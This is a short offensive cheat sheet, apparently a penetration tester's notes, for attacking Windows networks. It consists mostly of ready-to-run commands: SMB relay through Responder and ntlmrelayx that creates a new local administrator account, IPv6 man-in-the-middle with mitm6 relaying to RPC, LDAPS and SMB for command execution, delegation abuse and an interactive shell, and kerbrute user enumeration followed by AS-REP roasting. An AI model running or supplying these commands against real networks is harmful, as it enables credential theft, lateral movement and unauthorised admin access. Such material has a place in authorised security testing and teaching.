# Windows Exploitation Methods

## MITM

## SMB Relay

1. First disable SMB and HTTP in `/etc/responder/responder.conf`

2. Collect targets with signing disabled

    ```
    $ crackmapexec smb <CIDR> --gen-relay-list targets.txt
    ```

3. Run responder

    ```
    $ responder.py -I <interface> -r -d -w
    ```

4. Run ntlmrelay.py

    ```
    $ ntlmrelayx.py -tf targets.txt -c "net user user password /add && net localgroup Administrators user /add"
    ```

## IPv6

### run [mitm6](https://github.com/fox-it/mitm6) for ipv6
```
mitm6 -i eth0 -d example.local
```

### run [ntlmrelay](https://github.com/SecureAuthCorp/impacket) to execute a command

Use impacket's `ntlmrelay.py` for various attacks

```
# run a command
$ ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user user password /add && net localgroup Administrators user /add"
# add computer and delegate access
$ ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
# interactive shell
$ ntlmrelayx.py -wh attacker-wpad -t smb://example.local/ -i
```

## ASREPROAST

Get usernames

```
$ comb -s="." /opt/Spray/name-lists/english-first-1000.txt /opt/Spray/name-lists/english-last-1000.txt | tee usernames.txt
```

Run kerbrute

```
$ kerbrute userenum -d example.local usernames.txt -o kerbrute-out.log
```

Run ASREPROAST attack

```
GetNPUsers.py example.local/ -usersfile kerbrute-usernames.txt -dc-ip 192.168.1.10
```